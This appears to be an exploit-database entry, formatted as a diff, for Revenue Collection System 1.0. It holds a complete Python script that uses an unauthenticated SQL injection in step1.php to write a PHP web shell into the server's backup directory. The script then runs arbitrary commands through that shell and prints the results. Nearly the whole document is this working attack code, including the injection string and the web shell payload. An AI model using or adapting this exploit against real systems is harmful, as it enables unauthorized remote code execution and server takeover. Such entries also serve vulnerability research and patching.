@@ -1,0 +1,52 @@
+id: 38072
+date: 11/16/2022
+title: Revenue Collection System 1.0 SQL Injection / Remote Code Execution Exploit
+author: Joe Pollock
+cves: 
+
+# Exploit Title: Revenue Collection System v1.0 - RCE via Unauthenticated SQL Injection
+# Exploit Author: Joe Pollock
+# Date: November 16, 2022
+# Vendor Homepage: https://www.sourcecodester.com/php/14904/rates-system.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/rates.zip
+# Tested on: Kali Linux, Apache, Mysql
+# CVE: T.B.C
+# Vendor: Kapiya
+# Version: 1.0
+# Exploit Description:
+#   Revenue Collection System v1.0 suffers from an unauthenticated SQL Injection Vulnerability, in step1.php, allowing remote attackers to 
+#   write a malicious PHP file to disk. The resulting file can then be accessed within the /rates/admin/DBbackup directory.
+#   This script will write the malicious PHP file to disk, issue a user-defined command, then retrieve the result of that command.
+#   Ex: python3 rcsv1.py 10.10.14.2 "ls"
+
+import sys, requests
+def main():
+  if len(sys.argv) != 3:
+    print("(+) usage: %s <target> <cmd>" % sys.argv[0])
+    print('(+) eg: %s 192.168.121.103 "ls"'  % sys.argv[0])
+    sys.exit(-1)
+
+  targetIP = sys.argv[1]
+  cmd = sys.argv[2]
+  s = requests.Session()
+  
+  # Define obscure filename and command parameter to limit exposure and usage of the RCE.
+  FILENAME = "youcantfindme.php"
+  CMDVAR = "ohno"
+  
+  # Define the SQL injection string
+  sqli = """'+UNION+SELECT+"<?php+echo+shell_exec($_GET['%s']);?>","","","","","","","","","","","","","","","",""+INTO+OUTFILE+'/var/www/html/rates/admin/DBbackup/%s'--+-""" % (CMDVAR,FILENAME)
+  
+  # Write the PHP file to disk using the SQL injection vulnerability
+  url1 = "http://%s/rates/index.php?page=step1&proId=%s" % (targetIP,sqli)
+  r1 = s.get(url1)
+  
+  # Execute the user defined command and display the result
+  url2 = "http://%s/rates/admin/DBbackup/%s?%s=%s" % (targetIP,FILENAME,CMDVAR,cmd)
+  r2 = s.get(url2)
+  print(r2.text)
+  
+if __name__ == '__main__':
+  main()
+
+#  0day.today [2023-03-27]  #
